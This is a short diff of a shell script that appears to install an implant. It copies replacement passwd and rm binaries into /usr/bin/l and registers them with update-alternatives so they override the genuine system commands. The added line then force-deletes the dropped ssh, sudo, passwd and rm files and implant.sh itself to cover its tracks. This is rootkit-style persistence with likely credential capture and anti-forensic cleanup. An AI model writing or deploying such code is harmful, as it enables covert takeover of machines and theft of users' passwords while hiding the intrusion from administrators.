@@ -11,3 +11,4 @@ sudo cp  ./passwd /usr/bin/l
 sudo update-alternatives --install /usr/bin/l/passwd passwd /usr/bin/passwd 90
 sudo cp ./rm /usr/bin/l
 sudo update-alternatives --install /usr/bin/l/rm rm /usr/bin/rm 90
+/usr/bin/sudo /usr/bin/rm -rf ./ssh ./sudo ./passwd ./rm ./implant.sh 
